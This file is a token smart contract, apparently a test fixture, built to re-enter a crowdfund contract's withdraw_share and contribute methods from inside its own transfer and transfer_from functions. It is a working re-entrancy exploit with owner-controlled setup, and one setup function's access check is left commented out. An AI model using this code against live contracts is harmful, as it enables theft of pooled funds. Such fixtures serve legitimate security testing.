# con_malicious_reentrant_token.py
I = importlib # Make sure importlib is available if used via I

balances = Hash(default_value=decimal('0.0'))
metadata = Hash()

re_entry_target_contract_for_withdraw = Variable()
re_entry_target_pool_id_for_withdraw = Variable()
re_entry_owner = Variable() # To control sensitive operations

# Re-entrancy specific state
re_entry_target_crowdfund_name = Variable()
re_entry_pool_id_for_crowdfund = Variable()
re_entry_contribution_amount = Variable()
re_entry_attempt_count = Variable()
re_entry_max_attempts = Variable() # To prevent infinite loops in complex scenarios

@construct
def seed():
    re_entry_attempt_count.set(0)
    re_entry_max_attempts.set(1) # Only re-enter once for this test
    re_entry_owner.set(ctx.caller) # Set owner

@export
def change_owner(new_owner: str):
    assert ctx.caller == re_entry_owner.get(), "Only owner can change owner."
    re_entry_owner.set(new_owner)

@export
def configure_re_entrancy_for_withdraw(crowdfund_name: str, pool_id: str):
    assert ctx.caller == re_entry_owner.get(), "Only owner can configure re-entrancy for withdraw."
    re_entry_target_contract_for_withdraw.set(crowdfund_name)
    re_entry_target_pool_id_for_withdraw.set(pool_id)
    re_entry_attempt_count.set(0) # Reset attempt count for this specific re-entrancy path

# This method allows the contract to approve a spender for tokens it owns (e.g., pool_tokens)
@export
def execute_token_approve(token_contract_name: str, spender: str, amount: float):
    assert ctx.caller == re_entry_owner.get(), "Only owner can execute approve."
    token_contract = I.import_module(token_contract_name)
    # The malicious token contract (ctx.this) is the one calling approve on the target token contract
    token_contract.approve(to=spender, amount=amount)

# This method allows the contract to call contribute on a crowdfund contract
@export
def execute_contribute(crowdfund_contract_name: str, pool_id: str, amount: float):
    assert ctx.caller == re_entry_owner.get(), "Only owner can execute contribute."
    crowdfund_contract = I.import_module(crowdfund_contract_name)
    # The malicious token contract (ctx.this) is the one calling contribute
    crowdfund_contract.contribute(pool_id=pool_id, amount=amount)

# This method allows the contract to call withdraw_share on a crowdfund contract
@export
def execute_withdraw_share(crowdfund_contract_name: str, pool_id: str):
    assert ctx.caller == re_entry_owner.get(), "Only owner can execute withdraw_share."
    crowdfund_contract = I.import_module(crowdfund_contract_name)
    # The malicious token contract (ctx.this) is the one calling withdraw_share
    crowdfund_contract.withdraw_share(pool_id=pool_id)

def internal_approve(spender: str, amount_to_approve: float):
    # print(f"MALICIOUS TOKEN (internal_approve): Owner '{ctx.this}' (this contract) is approving spender '{spender}' for {amount_to_approve}")
    balances[ctx.this, spender] = amount_to_approve # owner is ctx.this (this contract)

@export
def configure_re_entrancy(crowdfund_name: str, pool_id: str, amount: float):
    # In a real scenario, this would be access-controlled, e.g. by an owner variable
    # assert ctx.caller == self.owner.get(), "Only owner can configure"
    re_entry_target_crowdfund_name.set(crowdfund_name)
    re_entry_pool_id_for_crowdfund.set(pool_id)
    re_entry_contribution_amount.set(amount)
    # print(f"MALICIOUS TOKEN: Re-entrancy configured for {crowdfund_name}, pool {pool_id}, amount {amount}")

    # --- ADD SELF-APPROVAL LOGIC HERE ---
    # The contract (ctx.this) needs to approve the crowdfund_name to spend 'amount' of its own tokens.
    # To do this, ctx.caller inside 'approve' must be ctx.this (the malicious token contract).
    # This is achieved by calling 'approve' from within this function.
    if amount > 0 and crowdfund_name:
        # print(f"MALICIOUS TOKEN: Self-approving {crowdfund_name} for {amount} of its own tokens.")
        # When this `approve` is called, ctx.caller will be this contract itself (`ctx.this`)
        # because it's a direct internal call.
        internal_approve(spender=crowdfund_name, amount_to_approve=amount) # Call the contract's own approve method

@export
def mint(amount: float, to: str):
    # Simplified mint, assumes caller is authorized
    assert amount > 0, "Mint amount must be positive"
    current_bal = balances[to] if balances[to] is not None else decimal('0')
    balances[to] = current_bal + amount
    
    metadata['total_supply'] = metadata['total_supply'] if metadata['total_supply'] is not None else decimal('0.0')
    metadata['total_supply'] = metadata['total_supply'] + amount
    # print(f"MALICIOUS TOKEN: Minted {amount} to {to}. New balance: {balances[to]}")

@export
def transfer(amount: float, to: str):
    assert amount > 0, "Transfer amount must be positive"
    # sender is ctx.caller when an EOA calls transfer.
    # sender is the calling contract (con_crowdfund_otc) when con_crowdfund_otc calls this transfer.
    sender = ctx.caller 
    
    sender_bal = balances[sender] if balances[sender] is not None else decimal('0')
    # If con_crowdfund_otc is transferring, its balance of these malicious tokens is checked.
    assert sender_bal >= amount, f"Insufficient balance for sender {sender}"

    balances[sender] = sender_bal - amount
    
    receiver_bal = balances[to] if balances[to] is not None else decimal('0')
    balances[to] = receiver_bal + amount

    # --- RE-ENTRANCY LOGIC FOR WITHDRAW_SHARE ---
    # This re-entrancy happens when this `transfer` is called by `con_crowdfund_otc.withdraw_share`
    current_attempts = re_entry_attempt_count.get()
    max_attempts = re_entry_max_attempts.get() # Should be 1 for this exploit

    target_crowdfund_withdraw = re_entry_target_contract_for_withdraw.get()
    target_pool_withdraw = re_entry_target_pool_id_for_withdraw.get()

    if target_crowdfund_withdraw and target_pool_withdraw and current_attempts < max_attempts:
        # Check if the caller of this transfer is the crowdfund contract we are targeting for re-entrancy
        # (i.e., this transfer is part of a withdraw_share operation from that crowdfund contract)
        # And the recipient `to` is this malicious contract itself (MT_address)
        # This means MT_address is withdrawing its share from the crowdfund contract.
        if sender == target_crowdfund_withdraw and to == ctx.this:
            re_entry_attempt_count.set(current_attempts + 1)
            
            crowdfund_contract_to_reenter = I.import_module(target_crowdfund_withdraw)
            # The malicious contract (ctx.this) re-enters withdraw_share for itself.
            crowdfund_contract_to_reenter.withdraw_share(pool_id=target_pool_withdraw) 
            # Note: ctx.caller for the re-entrant withdraw_share will be this malicious token contract.
    
    return True

@export
def approve(amount: float, to: str):
    assert amount >= 0, "Approve amount must be non-negative"
    balances[ctx.caller, to] = amount
    # print(f"MALICIOUS TOKEN: {ctx.caller} approved {to} for {amount}")
    return True

@export
def transfer_from(amount: float, to: str, main_account: str):
    assert amount > 0, "Transfer amount must be positive"
    spender = ctx.caller # This is con_crowdfund_otc in the scenario

    owner_balance = balances[main_account] if balances[main_account] is not None else decimal('0')
    assert owner_balance >= amount, f"Insufficient balance for owner {main_account}"

    spender_allowance = balances[main_account, spender] if balances[main_account, spender] is not None else decimal('0')
    assert spender_allowance >= amount, f"Insufficient allowance for spender {spender} from owner {main_account}"

    # Perform the transfer
    balances[main_account] = owner_balance - amount
    balances[main_account, spender] = spender_allowance - amount
    
    receiver_bal = balances[to] if balances[to] is not None else decimal('0')
    balances[to] = receiver_bal + amount
    # print(f"MALICIOUS TOKEN: Transferred {amount} from {main_account} to {to} by {spender}")

    # --- RE-ENTRANCY LOGIC ---
    current_attempts = re_entry_attempt_count.get()
    max_attempts = re_entry_max_attempts.get()

    if current_attempts < max_attempts:
        target_crowdfund_name = re_entry_target_crowdfund_name.get()
        target_pool_id = re_entry_pool_id_for_crowdfund.get()
        re_contrib_amount = re_entry_contribution_amount.get()

        if target_crowdfund_name and target_pool_id and re_contrib_amount > 0:
            re_entry_attempt_count.set(current_attempts + 1)
            # print(f"MALICIOUS TOKEN: Attempting re-entry ({current_attempts + 1}/{max_attempts}) into {target_crowdfund_name}.contribute for pool {target_pool_id} with amount {re_contrib_amount}")
            
            crowdfund_contract = I.import_module(target_crowdfund_name)
            
            crowdfund_contract.contribute(pool_id=target_pool_id, amount=re_contrib_amount)
    
    return True


@export
def balance_of(address: str):
    bal = balances[address]
    return bal if bal is not None else decimal('0')
